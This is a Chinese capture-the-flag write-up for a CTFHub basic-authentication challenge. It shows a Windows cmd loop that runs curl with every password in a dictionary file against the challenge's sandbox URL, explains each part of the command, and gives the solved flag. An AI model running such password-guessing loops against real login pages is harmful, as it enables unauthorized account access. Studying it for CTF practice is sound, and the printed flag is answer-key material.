# CTFHub 基础认证 writeup4

## 题目信息
来源:CTFHub

类型:web

日期：2026.10.10

## 心路历程
打开题目看见题目中附有一堆基础密码
猜测正确密码在里面

于是想到Burp爆破或用cmd输入指令尝试

选择cmd将字典保存为pass.txt放置桌面。

输入cd Desktop

使用 curl 编写循环命令来尝试for /f "delims=" %i in (pass.txt) do curl -u admin:%i "http://challenge-3ea6d98c5b79f533.sandbox.ctfhub.com:10800/flag.html"


但是使用后密码太多很难寻找

于是修改成for /f "delims=" %i in (pass.txt) do @echo 尝试密码：%i && curl -s -u admin:%i "http://challenge-3ea6d98c5b79f533.sandbox.ctfhub.com:10800/flag.html" | findstr "ctfhub" && echo =====================成功！密码=%i=====================

直接显示出正确的密码为1234567

默认用户名输入admin输入密码得到flag

## 收获
cmd查询密码代码编写

for /f：逐行读取文件

"delims="：读取完整一行，不会截断密码

%i：变量，存当前读到的密码

in (pass.txt)：读取的文件是密码字典 pass.txt

do：后面是每次循环要执行的命令

@echo 尝试密码：%i：打印当前正在测试的密码

curl：发送网页请求

-s：静默模式，不输出多余进度信息

-u admin:%i：Basic 认证，账号 admin，密码 % i

|：管道，把网页返回内容传给后面命令

findstr "ctfhub"：在返回内容里查找 flag 特征字符串 ctfhub

&&：前面查找成功，才执行后面语句

echo 成功，密码=%i：找到 flag，输出提示和正确密码

另一种方式Burp爆破方法可见[writeup24.md](./writeup24.md)

ctfhub{398d10f0c98f354338edb0b7}
